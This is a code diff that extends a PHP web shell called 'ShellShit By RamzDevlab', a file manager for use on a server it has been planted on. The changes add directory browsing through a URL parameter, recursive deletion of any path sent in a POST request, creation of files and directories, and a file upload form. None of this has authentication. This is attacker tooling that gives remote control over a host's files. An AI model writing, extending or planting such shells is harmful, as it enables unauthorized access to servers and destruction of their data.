@@ -11,7 +11,18 @@
 	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
 	<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" integrity="sha384-w1Q4orYjBQndcko6MimVbzY0tgp4pWB4lZ7lr30WKz0vr/aWKhXdBNmNb5D92v7s" crossorigin="anonymous"></script>
 
-    <title>ShellShit</title>
+    <title>ShellShit By RamzDevlab</title>
+
+	<style>
+		a{
+			color : white;
+			text-decoration: none;
+		}a:hover{
+			text-decoration: none;
+			color : green;
+		}
+
+	</style>
 </head>
 <body class="bg-dark">
 <?php
@@ -130,6 +141,16 @@ function filepermission($file){
 	
 }
 
+
+function delDir($dir) { 
+	$files = array_diff(scandir($dir), array('.','..')); 
+	 foreach ($files as $file) { 
+	   (is_dir("$dir/$file")) ? delDir("$dir/$file") : unlink("$dir/$file"); 
+	 } 
+	 return rmdir($dir); 
+} 
+
+
 // END FUNCTIONS ==================================================
 
 $serverhost =  $_SERVER['HTTP_HOST'];
@@ -141,7 +162,7 @@ $serverhost =  $_SERVER['HTTP_HOST'];
 		<table>
 			<tr>
 				<td><img src="https://1.bp.blogspot.com/-FWB7KaG6jV4/X_0cXca7uKI/AAAAAAAADOk/NtNe4wjiUBwsOc3nKQiOweXVxHaaKNI4gCLcBGAsYHQ/s320/shithe.png" style="width: 70px"></td>
-				<td><h1 class="mt-5 mb-5 text-danger font-weight-bold">< ShellShit /></h1></td>
+				<td><h1 class="mt-5 mb-5 text-danger font-weight-bold">< ShellShit <span class="text-light">RamzDevLab</span> /></h1></td>
 			</tr>
 		</table>
 		
@@ -275,9 +296,21 @@ $serverhost =  $_SERVER['HTTP_HOST'];
 				
 			}
 		//DELETE FILE
-			elseif($_POST['filedelete']){
-				unlink($_POST['filedelete']);
-				rmdir($_POST['filedelete']);
+			elseif(isset($_POST['filedelete'], $_POST['path'])){
+				if(isset($_GET['dir'])){
+					if(filetype($_POST['path']) == 'file'){
+						unlink($_POST['path']);
+					}else{
+						delDir($_POST['path']);
+					}
+				}else{
+					if(filetype($_POST['path']) == 'file'){
+						unlink($_POST['path']);
+					}else{
+						delDir($_POST['path']);
+					}
+				}
+				
 				?>
 						<div class="alert alert-danger alert-dismissible fade show" role="alert">
 						  <strong>Done !</strong>File/Dir Deleted Successful !.
@@ -288,13 +321,22 @@ $serverhost =  $_SERVER['HTTP_HOST'];
 				<?php
 			}
 		//MAKE NEW FILE OR DIR
-			elseif($_POST['newopsi']){
+			elseif(isset($_POST['newopsi'], $_POST['makefile'] )){
 				$opsi = $_POST['newopsi'];
-				if($opsi == 'File'){
-					fopen($_POST['makefile'], "w");
-				}elseif($opsi == 'Directory'){
-					mkdir(str_replace("'", "", $_POST['makefile']), 0777, true);
+				if(isset($_GET['dir'])){
+					if($opsi == 'File'){
+						fopen($_GET['dir'].'/'.$_POST['makefile'], "w");
+					}elseif($opsi == 'Directory'){
+						mkdir($_GET['dir'].'/'.str_replace("'", "", $_POST['makefile']), 0777, true);
+					}
+				}else{
+					if($opsi == 'File'){
+						fopen($_POST['makefile'], "w");
+					}elseif($opsi == 'Directory'){
+						mkdir(str_replace("'", "", $_POST['makefile']), 0777, true);
+					}
 				}
+				
 				?>
 						<div class="alert alert-success alert-dismissible fade show" role="alert">
 						  <strong>Done !</strong>File/Dir Created Successful !.
@@ -304,6 +346,7 @@ $serverhost =  $_SERVER['HTTP_HOST'];
 						</div>
 				<?php
 			}
+		
 		?>		
 		
 		<table>
@@ -361,11 +404,14 @@ $serverhost =  $_SERVER['HTTP_HOST'];
 						</button>
 					      </div>
 					      <div class="modal-body">
-						...
+							<form action="" method="post" enctype="multipart/form-data">
+							<input type="file" name="fileUpload" class="form-control">
+							
 					      </div>
 					      <div class="modal-footer">
 						<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-						<button type="button" class="btn btn-primary">Save changes</button>
+						<button type="submit" class="btn btn-primary">Upload</button>
+						</form>
 					      </div>
 					    </div>
 					  </div>
@@ -389,126 +435,140 @@ $serverhost =  $_SERVER['HTTP_HOST'];
 			</tr>
 			<?php 
 			
-
-
-
 			$directory = scandir(path());
 			
-				foreach($directory as $data){
-					
-					?>
-						<tr class="text-light">
-							<td><?php echo $data; ?></td>
-							<td><?php echo filetype($data); ?></td>
-							<td><?php echo filesize($data); ?></td>
-							<td><?php echo date ("F, d Y H:i:s",filemtime($data)); ?></td>
-							<td><?php echo posix_getpwuid(fileowner($data))['name'].'/'.posix_getpwuid(filegroup($data))['name']; ?></td>
-							<td><?php echo filepermission($data);?></td>
-							<td>
-								
-								<!-- RENAME OPTION -->
-								<button type="button" class="btn btn-primary btn-sm" data-toggle="modal" data-target="#exampleModal<?php echo str_replace('.', 'AABB', 									$data);?>">Rename
+			foreach($directory as $data){
+				
+				?>
+					<tr class="text-light">
+						<td><a href="?dir=<?php echo realpath($data.'/'); ?>"><?php echo $data; ?></a></td>
+						<td><?php echo filetype($data); ?></td>
+						<td><?php echo filesize($data); ?></td>
+						<td><?php echo date ("F, d Y H:i:s",filemtime($data)); ?></td>
+						<td><?php echo posix_getpwuid(fileowner($data))['name'].'/'.posix_getpwuid(filegroup($data))['name']; ?></td>
+						<td><?php echo filepermission($data);?></td>
+						<td>
+							<?php
+								if($data == '.' OR $data == '..'){
+
+								}else{
+									?>
+									<!-- RENAME OPTION -->
+							<button type="button" class="btn btn-primary btn-sm" data-toggle="modal" data-target="#exampleModal<?php echo str_replace('.', 'AABB', 									$data);?>">Rename
+							</button>
+							<!-- Modal Rename File -->
+							<div class="modal fade" id="exampleModal<?php echo str_replace('.', 'AABB', $data); ?>" tabindex="-1" aria-labelledby="exampleModalLabel" 										aria-hidden="true">
+							  <div class="modal-dialog">
+								<div class="modal-content text-dark">
+								  <div class="modal-header">
+								<h5 class="modal-title text-dark" id="exampleModalLabel">Rename <?php echo filetype($data); ?></h5>
+								<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+								  <span aria-hidden="true">&times;</span>
 								</button>
-								<!-- Modal Rename File -->
-								<div class="modal fade" id="exampleModal<?php echo str_replace('.', 'AABB', $data); ?>" tabindex="-1" aria-labelledby="exampleModalLabel" 										aria-hidden="true">
-								  <div class="modal-dialog">
-								    <div class="modal-content text-dark">
-								      <div class="modal-header">
-									<h5 class="modal-title text-dark" id="exampleModalLabel">Rename <?php echo filetype($data); ?></h5>
-									<button type="button" class="close" data-dismiss="modal" aria-label="Close">
-									  <span aria-hidden="true">&times;</span>
-									</button>
-								      </div>
-								      <div class="modal-body">
-									<form method="POST">
-										<label>File Name</label>
-										<input type="text" class="form-control mb-3" name="oldfilename" value="<?php echo $data; ?>" readonly/>
-										<label>New File Name</label>
-										<input type="text" class="form-control" name="newfilename" placeholder="Enter New File Name"/>
-									
-								      </div>
-								      <div class="modal-footer">
-									<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-									<button type="submit" class="btn btn-primary">Save changes</button>
-									</form>
-								      </div>
-								    </div>
+								  </div>
+								  <div class="modal-body">
+								<form method="POST">
+									<label>File Name</label>
+									<input type="text" class="form-control mb-3" name="oldfilename" value="<?php echo $data; ?>" readonly/>
+									<label>New File Name</label>
+									<input type="text" class="form-control" name="newfilename" placeholder="Enter New File Name"/>
+									<input type="hidden" name="path" value="<?php echo realpath($data.'/')?>">
+								  </div>
+								  <div class="modal-footer">
+								<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+								<button type="submit" class="btn btn-primary">Save changes</button>
+								</form>
 								  </div>
 								</div>
+							  </div>
+							</div>
 
 
-								
+							
 
 
-								<!-- DELETE OPTION -->
-								<button type="button" class="btn btn-danger btn-sm" data-toggle="modal" data-target="#delete<?php echo str_replace('.', 'AABB', 									$data);?>">Delete
+							<!-- DELETE OPTION -->
+							<button type="button" class="btn btn-danger btn-sm" data-toggle="modal" data-target="#delete<?php 
+							$allowed = array("A11", "B12"); 
+							$notallowed = array(" ", ".");  
+							echo str_replace($notallowed, $allowed, $data);
+							?>">Delete
+							</button>
+							<!-- Modal Rename File -->
+							<div class="modal fade" id="delete<?php 
+							$allowed = array("A11", "B12"); 
+							$notallowed = array(" ", ".");  
+							echo str_replace($notallowed, $allowed, $data);
+							?>" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+							  <div class="modal-dialog">
+								<div class="modal-content text-dark">
+								  <div class="modal-header">
+								<h5 class="modal-title text-dark" id="exampleModalLabel">Warning !</h5>
+								<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+								  <span aria-hidden="true">&times;</span>
+								</button>
+								  </div>
+								  <div class="modal-body">
+								<p>Will you delete this <?php echo filetype($data); ?> ?</p>
+								<form method="POST">
+									<input type="hidden" name="filedelete" value="<?php echo $data; ?>"/>
+									<input type="hidden" name="path" value="<?php echo realpath($data)?>">	
+								  </div>
+								  <div class="modal-footer">
+								<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+								<button type="submit" class="btn btn-danger">Continue</button>
+								</form>
+								  </div>
+								</div>
+							  </div>
+							</div>
+							<?php
+							if(filetype($data) == 'file'){
+								?>
+								<!-- EDIT OPTION -->
+								<button type="button" class="btn btn-success btn-sm" data-toggle="modal" data-target="#edit<?php echo str_replace('.', 'AABB', $data);?>">Edit
 								</button>
 								<!-- Modal Rename File -->
-								<div class="modal fade" id="delete<?php echo str_replace('.', 'AABB', $data); ?>" tabindex="-1" aria-labelledby="exampleModalLabel" 										aria-hidden="true">
-								  <div class="modal-dialog">
-								    <div class="modal-content text-dark">
-								      <div class="modal-header">
-									<h5 class="modal-title text-dark" id="exampleModalLabel">Warning !</h5>
+								<div class="modal fade" id="edit<?php echo str_replace('.', 'AABB', $data); ?>" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+								<div class="modal-dialog">
+									<div class="modal-content text-dark">
+									<div class="modal-header">
+									<h5 class="modal-title text-dark" id="exampleModalLabel">Edit File</h5>
 									<button type="button" class="close" data-dismiss="modal" aria-label="Close">
-									  <span aria-hidden="true">&times;</span>
+									<span aria-hidden="true">&times;</span>
 									</button>
-								      </div>
-								      <div class="modal-body">
-									<p>Will you delete this <?php echo filetype($data); ?> ?</p>
+									</div>
+									<div class="modal-body">
 									<form method="POST">
-										<input type="hidden" name="filedelete" value="<?php echo $data; ?>"/>	
-								      </div>
-								      <div class="modal-footer">
+										<textarea rows="20" cols="" class="form-control" name="newtext">
+											<?php
+												$file = fopen($data, "r+");
+												
+											?>
+										</textarea>	
+									</div>
+									<div class="modal-footer">
 									<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
 									<button type="submit" class="btn btn-danger">Continue</button>
 									</form>
-								      </div>
-								    </div>
-								  </div>
+									</div>
+									</div>
 								</div>
+								</div>
+								
 								<?php
-								if(filetype($data) == 'file'){
-									?>
-									<!-- EDIT OPTION -->
-									<button type="button" class="btn btn-success btn-sm" data-toggle="modal" data-target="#edit<?php echo str_replace('.', 'AABB', $data);?>">Edit
-									</button>
-									<!-- Modal Rename File -->
-									<div class="modal fade" id="edit<?php echo str_replace('.', 'AABB', $data); ?>" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
-									<div class="modal-dialog">
-										<div class="modal-content text-dark">
-										<div class="modal-header">
-										<h5 class="modal-title text-dark" id="exampleModalLabel">Edit File</h5>
-										<button type="button" class="close" data-dismiss="modal" aria-label="Close">
-										<span aria-hidden="true">&times;</span>
-										</button>
-										</div>
-										<div class="modal-body">
-										<form method="POST">
-											<textarea rows="20" cols="" class="form-control" name="newtext">
-												<?php
-													$file = fopen($data, "r+");
-													
-												?>
-											</textarea>	
-										</div>
-										<div class="modal-footer">
-										<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
-										<button type="submit" class="btn btn-danger">Continue</button>
-										</form>
-										</div>
-										</div>
-									</div>
-									</div>
-									
-									<?php
+							}
+							
+							
 								}
-								
-								
-								?>
-							</td>
-						</tr>
-					<?php
-				}
+							
+							?>
+							
+						</td>
+					</tr>
+				<?php
+			}
+			
 
 			?>
 		</table>
